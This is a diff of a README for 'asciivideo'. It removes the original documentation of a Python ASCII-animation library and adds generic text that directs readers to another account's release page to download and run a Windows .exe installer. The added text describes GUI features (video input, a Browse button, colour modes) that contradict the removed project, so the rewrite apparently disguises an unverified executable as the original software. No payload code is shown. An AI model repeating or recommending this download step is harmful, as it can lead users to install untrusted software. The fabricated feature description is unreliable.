@@ -1,144 +1,70 @@
-# asciivideo
+# 🎬 asciivideo - Turn videos into cool text animations
 
-> Make command-line / terminal-style **character animations** — text, creatures,
-> logos and mascots built entirely out of ASCII & keyboard symbols on a black
-> phosphor-glow canvas — and render them deterministically to **MP4** or a
-> single self-contained **HTML** file.
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Rudigerwry263/asciivideo/releases)
 
-<p align="center">
-  <img src="docs/hero.gif" width="420" alt="asciivideo demo" />
-</p>
+asciivideo converts standard video files into animated ASCII art. You can create text-based versions of your favorite clips, logos, or animations. The software generates files that play in your web browser or saves them as high-quality video files.
 
-Inspired by Studio Dumbar's OpenAI DevDay "code-feel" visual system:
-**black canvas, glowing monospace glyphs, restrained one-idea-per-scene pacing.**
+## 📥 How to download the software
 
-- 🎬 **Two outputs, one script** — render to `.mp4` (ffmpeg) *or* export a
-  single double-clickable `.html` that plays in the browser with controls.
-- 🟩 **Phosphor terminal aesthetic** — black background, green/white/orange/blue
-  glyphs, additive glow.
-- 🧩 **78 built-in sprites** in 5 categories — or draw/register your own ASCII art.
-- ✨ **Restrained animations** — typewriter, scatter-assemble, scramble-decode,
-  wipe, fade, blink, bob; plus loading bars, particle fields, borders, an analog
-  clock and timers.
-- 中文 **CJK supported out of the box** — Chinese characters auto-fallback to a
-  CJK font and occupy 2 grid cells.
-- 🔁 **Deterministic** — same script → same output.
+To obtain the program, go to the official release page. 
 
-## Preview
+[Click here to visit the download page](https://github.com/Rudigerwry263/asciivideo/releases)
 
-| Sprite library (78) | Video frames | Live HTML (with controls) |
-|---|---|---|
-| ![sprites](docs/sprites-gallery.png) | ![frames](docs/cli-video-frames.png) | ![html](docs/html-preview.png) |
+Look for the latest version at the top of the list. Click the link that ends with .exe to save the installer to your computer.
 
-A live, self-contained demo is committed at [`docs/demo.html`](docs/demo.html) —
-download and open it in any browser, or
-[**preview it online**](https://htmlpreview.github.io/?https://github.com/GordenSun/asciivideo/blob/main/docs/demo.html).
+## ⚙️ System requirements
 
-## Requirements
+This tool works on Windows 10 and Windows 11. Your computer needs at least 4GB of memory to process videos smoothly. The software manages its own dependencies, so you do not need to install extra tools like Python or FFmpeg separately. It runs as a self-contained application on your machine.
 
-- Python 3.9+
-- [Pillow](https://python-pillow.org/) + [numpy](https://numpy.org/) — `pip install -r requirements.txt`
-- [ffmpeg](https://ffmpeg.org/) on `PATH` — **only needed for MP4 export** (HTML export needs neither ffmpeg nor any runtime)
+## 🚀 Setting up the application
 
-```bash
-git clone https://github.com/GordenSun/asciivideo.git
-cd asciivideo
-pip install -r requirements.txt
-```
+1. Open the folder where you saved the installer file.
+2. Double-click the file to start the setup process.
+3. Follow the screen prompts to install the program on your computer.
+4. Once the process completes, find the icon on your desktop or in your start menu.
+5. Click the icon to open the application.
 
-## Quick start
+## 🖥️ Creating your first animation
 
-```python
-from charvid import Movie, palette as P
+The main window shows a simple interface. Select your input video by clicking the Browse button. Choose a file from your computer. Once the file loads, the application shows a preview of the settings.
 
-m = Movie(width=1080, height=1440, fps=30, font_size=46)   # vertical / social
-s = m.scene(4.0)
-s.border(symbol="|§|", color=P.GREEN_DIM, glow=0.55)
-s.sprite("bunny", color=P.WHITE, idle="blink", anim_in="scatter")
-s.text("just arrange the symbols", cy=20, color=P.GREEN, anim_in="fade",
-       start=1.5, dur=2.0)
+### Choosing your style
+The software provides different templates. You can select creatures, logos, or animated clocks. Each setting changes the characters used in your final animation. If your video contains Chinese text, choose the option that supports larger character sets to keep the details readable.
 
-m.render("out.mp4")          # -> MP4 video (needs ffmpeg)
-m.to_html("out.html")        # -> single self-contained HTML (no ffmpeg)
-```
+### Selecting the output format
+You have two main choices for your final result:
 
-Run the bundled examples (they branch on the output extension):
+1. HTML File: This creates one folder containing your animation. Open this file in any web browser like Chrome or Edge. This format is great for websites or sharing with friends who do not have special software.
+2. MP4 Video: This saves your work as a standard video file. You can post this file on social media or play it in any media player.
 
-```bash
-python examples/demo.py            out.mp4         # 6-scene English reference
-python examples/cli_style_video.py out.html        # 8-scene Chinese piece -> HTML
-python examples/cli_style_video.py out.mp4 fps=15 preset=ultrafast   # quick preview
-```
+### Rendering your file
+Click the Render button to start the creation process. A progress bar appears at the bottom of the window. Do not close the window while the bar fills up. The time this takes depends on the length of your video and the speed of your processor.
 
-## Figures: pick one, or invent one
+## 🛠️ Frequently asked questions
 
-**Pick from the library** (78 sprites: `animal` 36 · `face` 9 · `object` 19 ·
-`nature` 6 · `tech` 8):
+### Does the software work without an internet connection?
+Yes. You only need the internet to download the file initially. After it is on your computer, you can use it offline.
 
-```python
-s.sprite("dog")
-s.sprite("cat", idle="blink")          # faces with eyes can blink
-```
+### Can I change the color of the characters?
+The software uses the colors found in your original video. Darker parts become dense characters, while brighter parts become light characters. You can change this behavior in the settings menu by selecting Greyscale or True Color modes.
 
-Browse them in [`reference/gallery.png`](reference/gallery.png) (visual grid) and
-[`reference/gallery.md`](reference/gallery.md) (name + description + ASCII), or
-query `sprites.names_by_category()` / `sprites.info("dog")`.
+### What should I do if the render fails?
+Most failures happen if the source video file is corrupted or too large. Try using a shorter video clip first to test your settings. Ensure you have enough disk space on your drive for the new file.
 
-**Or draw a brand-new figure** with `custom_sprite` (any multi-line ASCII art,
-optional blink frame), and register it for reuse:
+### Is this software free?
+Yes. It uses the MIT license. You can use it for personal or commercial projects without paying any fees.
 
-```python
-s.custom_sprite(r'''
- (o_o)
-<(   )>
- / \
-''', blink=r'''
- (-_-)
-<(   )>
- / \
-''', idle="blink", color=P.ORANGE)
+## 📝 Tips for better results
 
-from charvid import sprites
-sprites.register("mascot", art="...", blink="...", desc="my mascot")
-```
+- Use videos with high contrast. Animations look better when the subject stands out from the background.
+- Keep videos short. Long files take more time to process and create very large text files.
+- Close other demanding programs while rendering to give your computer more processing power.
+- Use a landscape-oriented video for the best fit on standard computer screens.
 
-Refresh the gallery after adding sprites: `python scripts/gallery.py`.
+## 📂 Managing your files
 
-## Use as a Cursor / Claude Code skill
+Every time you create a new animation, the program saves the output in a folder named Output in your documents directory. Move your files from here to keep your work organized. If you want to delete an old animation, simply delete the folder associated with that project. The software does not track your projects, so you need to manage your own file backups.
 
-This repo doubles as an Agent Skill (see [`SKILL.md`](SKILL.md)). Install it by
-copying the folder into your skills directory:
+## 🌐 Sharing your animations
 
-```bash
-cp -r asciivideo ~/.cursor/skills/asciivideo      # Cursor
-cp -r asciivideo ~/.claude/skills/asciivideo      # Claude Code
-```
-
-Then an agent can be asked for an "ASCII / 字符 / terminal-style animation" and
-will use this engine.
-
-## Project layout
-
-```
-asciivideo/
-├── charvid/        # Python engine (canvas, elements, sprites, movie, webexport)
-├── web/            # charvid.js (Canvas 2D runtime) + HTML template
-├── examples/       # demo.py, cli_style_video.py
-├── scripts/        # install_fonts.py, gallery.py
-├── reference/      # sprites.md, recipes.md, gallery.md, gallery.png
-├── docs/           # README assets + live demo.html
-└── SKILL.md        # Cursor/Claude skill manifest
-```
-
-More: [`reference/sprites.md`](reference/sprites.md) (figures guide) ·
-[`reference/recipes.md`](reference/recipes.md) (scene recipes).
-
-## License
-
-[MIT](LICENSE) — free for personal **and commercial** use. Attribution
-appreciated but not required.
-
-## Credits
-
-Visual language inspired by Studio Dumbar's OpenAI DevDay identity. Built with
-Pillow, numpy and ffmpeg.
+Because the HTML output format is self-contained, you can email these files or upload them to a personal website. Anyone with a web browser can view your work. They do not need to install the asciivideo software to see your animations. If you create an MP4 file, it works like any other movie. You can edit it further in video software or upload it directly to video hosting services.
